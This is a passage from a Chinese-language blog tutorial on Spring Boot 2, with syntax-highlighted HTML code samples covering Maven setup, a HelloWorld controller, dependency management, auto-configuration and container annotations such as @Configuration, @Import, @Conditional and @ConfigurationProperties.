<li>Maven 3.3+</li>
<li>idea 2019.1.2</li>
</ul>
<h2 id="maven设置"><a href="#maven设置" class="headerlink" title="maven设置"></a>maven设置</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-aliyun<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus aliyun<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>需求：浏览发送/hello请求，响应 Hello，Spring Boot 2 </p>
<h3 id="创建maven工程"><a href="#创建maven工程" class="headerlink" title="创建maven工程"></a>创建maven工程</h3><h3 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="创建主程序"><a href="#创建主程序" class="headerlink" title="创建主程序"></a>创建主程序</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 主程序类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@SpringBootApplication</span>：这是一个SpringBoot应用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(MainApplication<span class="class">.<span class="keyword">class</span>,<span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="编写业务"><a href="#编写业务" class="headerlink" title="编写业务"></a>编写业务</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(<span class="meta-string">"/hello"</span>)</span></span><br><span class="line">    <span class="keyword">public</span> String handle01()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello, Spring Boot 2!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>直接运行main方法</p>
<h3 id="简化配置"><a href="#简化配置" class="headerlink" title="简化配置"></a>简化配置</h3><p>application.properties</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="number">8888</span></span><br></pre></td></tr></table></figure>
<h3 id="简化部署"><a href="#简化部署" class="headerlink" title="简化部署"></a>简化部署</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>把项目打成jar包，直接在目标服务器执行即可。</p>
<p>注意点：</p>
<ul>
<li>取消掉cmd的快速编辑模式</li>
</ul>
<h1 id="了解自动配置原理"><a href="#了解自动配置原理" class="headerlink" title="了解自动配置原理"></a>了解自动配置原理</h1><h2 id="SpringBoot特点"><a href="#SpringBoot特点" class="headerlink" title="SpringBoot特点"></a>SpringBoot特点</h2><h3 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h3><ul>
<li>父项目做依赖管理</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">依赖管理    </span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">他的父项目</span><br><span class="line"> <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">几乎声明了所有开发中常用的依赖的版本号,自动版本仲裁机制</span><br></pre></td></tr></table></figure>
<ul>
<li>开发导入starter场景启动器<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、见到很多 spring-boot-starter-* ： *就某种场景</span><br><span class="line"><span class="number">2</span>、只要引入starter，这个场景的所有常规需要的依赖我们都自动引入</span><br><span class="line"><span class="number">3</span>、SpringBoot所有支持的场景</span><br><span class="line"><span class="symbol">https:</span><span class="comment">//docs.spring.io/spring-boot/docs/current/reference/html/using-spring-boot.html#using-boot-starter</span></span><br><span class="line"><span class="number">4</span>、见到的  *-spring-boot-starter： 第三方为我们提供的简化开发的场景启动器。</span><br><span class="line"><span class="number">5</span>、所有场景启动器最底层的依赖</span><br><span class="line"><span class="params">&lt;dependency&gt;</span></span><br><span class="line">  <span class="params">&lt;groupId&gt;</span>org.springframework.boot<span class="params">&lt;/groupId&gt;</span></span><br><span class="line">  <span class="params">&lt;artifactId&gt;</span>spring-boot-starter<span class="params">&lt;/artifactId&gt;</span></span><br><span class="line">  <span class="params">&lt;version&gt;</span><span class="number">2.4</span><span class="number">.5</span><span class="params">&lt;/version&gt;</span></span><br><span class="line">  <span class="params">&lt;scope&gt;</span>compile<span class="params">&lt;/scope&gt;</span></span><br><span class="line"><span class="params">&lt;/dependency&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>无需关注版本号，自动版本仲裁</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、引入依赖默认都可以不写版本</span><br><span class="line"><span class="number">2</span>、引入非版本仲裁的jar，要写版本号。</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以修改默认版本号</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、查看spring-boot-dependencies里面规定当前依赖的版本 用的 <span class="type">key</span>。</span><br><span class="line"><span class="number">2</span>、在当前项目里面重写配置</span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;mysql.version&gt;<span class="number">5.1</span><span class="number">.43</span>&lt;/mysql.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="自动配置"><a href="#自动配置" class="headerlink" title="自动配置"></a>自动配置</h3><ul>
<li><p>自动配好Tomcat</p>
<ul>
<li>引入Tomcat依赖。</li>
<li>配置Tomcat</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>自动配好SpringMVC</p>
<ul>
<li>引入SpringMVC全套组件</li>
<li>自动配好SpringMVC常用组件（功能）</li>
</ul>
</li>
<li><p>自动配好Web常见功能，如：字符编码问题</p>
<ul>
<li>SpringBoot帮我们配置好了所有web开发的常见场景</li>
</ul>
</li>
<li><p>默认的包结构</p>
<ul>
<li>主程序所在包及其下面的所有子包里面的组件都会被默认扫描进来</li>
<li>无需以前的包扫描配置</li>
<li><p>想要改变扫描路径，@SpringBootApplication(scanBasePackages=<strong>“com.atguigu”</strong>)</p>
<ul>
<li>或者@ComponentScan 指定扫描路径</li>
</ul>
</li>
</ul>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="variable">@SpringBootApplication</span></span><br><span class="line">等同于</span><br><span class="line"><span class="variable">@SpringBootConfiguration</span></span><br><span class="line"><span class="variable">@EnableAutoConfiguration</span></span><br><span class="line"><span class="variable">@ComponentScan</span>(<span class="string">"com.atguigu.boot"</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>各种配置拥有默认值</p>
<ul>
<li>默认配置最终都是映射到某个类上，如：MultipartProperties</li>
<li>配置文件的值最终会绑定每个类上，这个类会在容器中创建对象</li>
</ul>
</li>
<li><p>按需加载所有自动配置项</p>
<ul>
<li>非常多的starter</li>
<li>引入了哪些场景这个场景的自动配置才会开启</li>
<li>SpringBoot所有的自动配置功能都在 spring-boot-autoconfigure 包里面</li>
<li></li>
</ul>
</li>
<li>……</li>
</ul>
<h2 id="容器功能"><a href="#容器功能" class="headerlink" title="容器功能"></a>容器功能</h2><h3 id="组件添加"><a href="#组件添加" class="headerlink" title="组件添加"></a>组件添加</h3><h4 id="Configuration"><a href="#Configuration" class="headerlink" title="@Configuration"></a>@Configuration</h4><ul>
<li>基本使用</li>
<li><p><strong>Full模式与Lite模式</strong></p>
</li>
<li><ul>
<li>示例</li>
<li>最佳实战</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>配置 类组件之间无依赖关系用Lite模式加速容器启动过程，减少判断</li>
<li>配置类组件之间有依赖关系，方法会被调用得到之前单实例组件，用Full模式</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">#############################Configuration使用示例######################################################</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1、配置类里面使用@Bean标注在方法上给容器注册组件，默认也是单实例的</span></span><br><span class="line"><span class="comment"> * 2、配置类本身也是组件</span></span><br><span class="line"><span class="comment"> * 3、proxyBeanMethods：代理bean的方法</span></span><br><span class="line"><span class="comment"> *      Full(proxyBeanMethods = true)、【保证每个@Bean方法被调用多少次返回的组件都是单实例的】</span></span><br><span class="line"><span class="comment"> *      Lite(proxyBeanMethods = false)【每个@Bean方法被调用多少次返回的组件都是新创建的】</span></span><br><span class="line"><span class="comment"> *      组件依赖必须使用Full模式默认。其他默认是否Lite模式</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@Configuration(proxyBeanMethods = false) <span class="comment">//告诉SpringBoot这是一个配置类 == 配置文件</span></span><br><span class="line">public <span class="keyword">class</span> MyConfig &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Full:外部无论对配置类中的这个组件注册方法调用多少次获取的都是之前注册容器中的单实例对象</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    @Bean <span class="comment">//给容器中添加组件。以方法名作为组件的id。返回类型就是组件类型。返回的值，就是组件在容器中的实例</span></span><br><span class="line">    public User user01()&#123;</span><br><span class="line">        User zhangsan = new User(<span class="string">"zhangsan"</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="comment">//user组件依赖了Pet组件</span></span><br><span class="line">        zhangsan.setPet(tomcatPet());</span><br><span class="line">        return zhangsan;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Bean(<span class="string">"tom"</span>)</span><br><span class="line">    public Pet tomcatPet()&#123;</span><br><span class="line">        return new Pet(<span class="string">"tomcat"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">################################@Configuration测试代码如下########################################</span><br><span class="line">@SpringBootConfiguration</span><br><span class="line">@EnableAutoConfiguration</span><br><span class="line">@ComponentScan(<span class="string">"com.atguigu.boot"</span>)</span><br><span class="line">public <span class="keyword">class</span> MainApplication &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        <span class="comment">//1、返回我们IOC容器</span></span><br><span class="line">        ConfigurableApplicationContext run = SpringApplication.run(MainApplication.<span class="keyword">class</span>, args);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2、查看容器里面的组件</span></span><br><span class="line">        String[] names = run.getBeanDefinitionNames();</span><br><span class="line">        for (String name : names) &#123;</span><br><span class="line">            System.out.println(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3、从容器中获取组件</span></span><br><span class="line"></span><br><span class="line">        Pet tom01 = run.getBean(<span class="string">"tom"</span>, Pet.<span class="keyword">class</span>);</span><br><span class="line"></span><br><span class="line">        Pet tom02 = run.getBean(<span class="string">"tom"</span>, Pet.<span class="keyword">class</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"组件："</span>+(tom01 == tom02));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//4、com.atguigu.boot.config.MyConfig$$EnhancerBySpringCGLIB$$51f1e1ca@1654a892</span></span><br><span class="line">        MyConfig bean = run.getBean(MyConfig.<span class="keyword">class</span>);</span><br><span class="line">        System.out.println(bean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果@Configuration(proxyBeanMethods = true)代理对象调用方法。SpringBoot总会检查这个组件是否在容器中有。</span></span><br><span class="line">        <span class="comment">//保持组件单实例</span></span><br><span class="line">        User user = bean.user01();</span><br><span class="line">        User user1 = bean.user01();</span><br><span class="line">        System.out.println(user == user1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        User user01 = run.getBean(<span class="string">"user01"</span>, User.<span class="keyword">class</span>);</span><br><span class="line">        Pet tom = run.getBean(<span class="string">"tom"</span>, Pet.<span class="keyword">class</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"用户的宠物："</span>+(user01.getPet() == tom));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Bean、-Component、-Controller、-Service、-Repository"><a href="#Bean、-Component、-Controller、-Service、-Repository" class="headerlink" title="@Bean、@Component、@Controller、@Service、@Repository"></a>@Bean、@Component、@Controller、@Service、@Repository</h4><h4 id="ComponentScan、-Import"><a href="#ComponentScan、-Import" class="headerlink" title="@ComponentScan、@Import"></a>@ComponentScan、@Import</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"> * <span class="number">4</span>、@<span class="keyword">Import</span>(&#123;<span class="keyword">User</span>.<span class="keyword">class</span>, DBHelper.<span class="keyword">class</span>&#125;)</span><br><span class="line"> *      给容器中自动创建出这两个类型的组件、默认组件的名字就是全类名</span><br><span class="line"> *</span><br><span class="line"> *</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@<span class="keyword">Import</span>(&#123;<span class="keyword">User</span>.<span class="keyword">class</span>, DBHelper.<span class="keyword">class</span>&#125;)</span><br><span class="line">@<span class="keyword">Configuration</span>(proxyBeanMethods = <span class="keyword">false</span>) //告诉SpringBoot这是一个配置类 == 配置文件</span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> MyConfig &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>[@Import 高级用法：] (<a href="https://www.bilibili.com/video/BV1gW411W7wy?p=8" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1gW411W7wy?p=8</a>)</p>
<h4 id="Conditional"><a href="#Conditional" class="headerlink" title="@Conditional"></a>@Conditional</h4><p>条件装配：满足Conditional指定的条件，则进行组件注入</p>
<p><img src="/img/springboo2/条件装配/image.png" alt="avatar"></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">=====================测试条件装配==========================</span><br><span class="line">@<span class="constructor">Configuration(<span class="params">proxyBeanMethods</span> = <span class="params">false</span>)</span> <span class="comment">//告诉SpringBoot这是一个配置类 == 配置文件</span></span><br><span class="line"><span class="comment">//@ConditionalOnBean(name = "tom")</span></span><br><span class="line">@<span class="constructor">ConditionalOnMissingBean(<span class="params">name</span> = <span class="string">"tom"</span>)</span></span><br><span class="line">public <span class="keyword">class</span> MyConfig &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Full:外部无论对配置类中的这个组件注册方法调用多少次获取的都是之前注册容器中的单实例对象</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    @Bean <span class="comment">//给容器中添加组件。以方法名作为组件的id。返回类型就是组件类型。返回的值，就是组件在容器中的实例</span></span><br><span class="line">    public User user01<span class="literal">()</span>&#123;</span><br><span class="line">        User zhangsan = <span class="keyword">new</span> <span class="constructor">User(<span class="string">"zhangsan"</span>, 18)</span>;</span><br><span class="line">        <span class="comment">//user组件依赖了Pet组件</span></span><br><span class="line">        zhangsan.set<span class="constructor">Pet(<span class="params">tomcatPet</span>()</span>);</span><br><span class="line">        return zhangsan;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="constructor">Bean(<span class="string">"tom22"</span>)</span></span><br><span class="line">    public Pet tomcat<span class="constructor">Pet()</span>&#123;</span><br><span class="line">        return <span class="keyword">new</span> <span class="constructor">Pet(<span class="string">"tomcat"</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static void main(String<span class="literal">[]</span> args) &#123;</span><br><span class="line">        <span class="comment">//1、返回我们IOC容器</span></span><br><span class="line">        ConfigurableApplicationContext run = <span class="module-access"><span class="module"><span class="identifier">SpringApplication</span>.</span></span>run(<span class="module-access"><span class="module"><span class="identifier">MainApplication</span>.</span></span><span class="keyword">class</span>, args);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2、查看容器里面的组件</span></span><br><span class="line">        String<span class="literal">[]</span> names = run.get<span class="constructor">BeanDefinitionNames()</span>;</span><br><span class="line">        for (String name : names) &#123;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        boolean tom = run.contains<span class="constructor">Bean(<span class="string">"tom"</span>)</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"容器中Tom组件："</span>+tom);</span><br><span class="line"></span><br><span class="line">        boolean user01 = run.contains<span class="constructor">Bean(<span class="string">"user01"</span>)</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"容器中user01组件："</span>+user01);</span><br><span class="line"></span><br><span class="line">        boolean tom22 = run.contains<span class="constructor">Bean(<span class="string">"tom22"</span>)</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"容器中tom22组件："</span>+tom22);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="原生配置文件引入"><a href="#原生配置文件引入" class="headerlink" title="原生配置文件引入"></a>原生配置文件引入</h3><h4 id="ImportResource"><a href="#ImportResource" class="headerlink" title="@ImportResource"></a>@ImportResource</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">======================beans.xml=========================</span><br><span class="line">&lt;?<span class="type">xml</span> version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;beans xmlns="http://www.springframework.org/schema/beans"</span><br><span class="line">       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span><br><span class="line">       xmlns:context="http://www.springframework.org/schema/context"</span><br><span class="line">       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id="haha" <span class="keyword">class</span>="com.atguigu.boot.bean.User"&gt;</span><br><span class="line">        &lt;property <span class="type">name</span>="name" <span class="keyword">value</span>="zhangsan"&gt;&lt;/property&gt;</span><br><span class="line">        &lt;property <span class="type">name</span>="age" <span class="keyword">value</span>="18"&gt;&lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id="hehe" <span class="keyword">class</span>="com.atguigu.boot.bean.Pet"&gt;</span><br><span class="line">        &lt;property <span class="type">name</span>="name" <span class="keyword">value</span>="tomcat"&gt;&lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br><span class="line">@ImportResource("classpath:beans.xml")</span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> MyConfig &#123;&#125;</span><br><span class="line"></span><br><span class="line">======================测试=================</span><br><span class="line">        <span class="type">boolean</span> haha = run.containsBean("haha");</span><br><span class="line">        <span class="type">boolean</span> hehe = run.containsBean("hehe");</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("haha："+haha);//<span class="keyword">true</span></span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("hehe："+hehe);//<span class="keyword">true</span></span><br></pre></td></tr></table></figure>
<h3 id="配置绑定"><a href="#配置绑定" class="headerlink" title="配置绑定"></a>配置绑定</h3><p>如何使用Java读取到properties文件中的内容，并且把它封装到JavaBean中，以供随时使用；</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">getProperties</span> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="keyword">String</span>[] args) throws FileNotFoundException, IOException &#123;</span><br><span class="line">         Properties pps = <span class="keyword">new</span> <span class="type">Properties</span>();</span><br><span class="line">         pps.load(<span class="keyword">new</span> <span class="type">FileInputStream</span>(<span class="string">"a.properties"</span>));</span><br><span class="line">         Enumeration enum1 = pps.propertyNames();<span class="comment">//得到配置文件的名字</span></span><br><span class="line">         <span class="keyword">while</span>(enum1.hasMoreElements()) &#123;</span><br><span class="line">             <span class="keyword">String</span> strKey = (<span class="keyword">String</span>) enum1.nextElement();</span><br><span class="line">             <span class="keyword">String</span> strValue = pps.getProperty(strKey);</span><br><span class="line">             System.out.println(strKey + <span class="string">"="</span> + strValue);</span><br><span class="line">             <span class="comment">//封装到JavaBean。</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h4 id="ConfigurationProperties"><a href="#ConfigurationProperties" class="headerlink" title="@ConfigurationProperties"></a>@ConfigurationProperties</h4><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 只有在容器中的组件，才会拥有SpringBoot提供的强大功能</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@Component</span><br><span class="line">@ConfigurationProperties(prefix = <span class="string">"mycar"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Car</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> brand;</span><br><span class="line">    <span class="keyword">private</span> Integer price;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getBrand</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> brand;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBrand</span><span class="params">(<span class="keyword">String</span> brand)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.brand = brand;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getPrice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 